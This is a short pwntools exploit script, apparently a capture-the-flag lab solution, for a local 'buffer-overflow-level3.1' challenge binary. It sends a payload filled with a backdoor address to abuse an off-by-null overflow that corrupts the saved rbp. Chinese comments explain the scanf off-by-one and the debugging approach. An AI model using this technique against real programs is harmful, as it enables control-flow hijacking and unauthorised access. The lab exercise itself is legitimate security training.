from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level3.1"
p = process(challenge_path)

# create string
backdoor = 0x401300
name = '1' * 32
shellcode=b'\x61' * 16+b'\x00\x13\x40\x00\x00\x00\x00\x00'*240+b'\x01'+b'\x00'
p.sendafter("Give me your name:\n",name)
p.sendafter("Say something to me:\n",shellcode)
#p.sendlineafter("Bye bye~\n","read_flag();")
# 接收题目的输出
result = p.recvall()

# 打印题目的输出python3 /home/hacker/buf3.1.py
print(result)
'''
Off-By-Null溢出一个空字节，让堆块的prev inuse 位溢出为0，从而认为他的地地址堆块处于free状态，然后利用
观察到scanf("%256s*c", buf);说明在读入256字符后，还会尝试读入一个字符但是不会放入缓冲区
所以只需要多送两个字符，一个是c，一个是空字符用于降低rbp地址（使得其低位变为00），从而导致main函数

搞清楚子函数的调用过程，x64的参数是放在寄存器里，所以调用前压入rip，再压入rbp，更新rbp为rsp，更新rsp

监视发现buf溢出之后影响到了栈中的原rbp，也就是说函数返回的时候，栈底的位置错误
本来是d0移到00，正好是buf的部分。即无法影响input_message的返回（很奇怪，覆盖不了rip的地址）但可以影响main的！！！
返回main后rbp的值是错误的，故main退出时转到的地址应该是buf中的对应位置
然后就是gdb动态调试发现每次rbp的值都不一样，buf全放入read_flag的地址就好了

checksec filename 查看文件保护机制
'''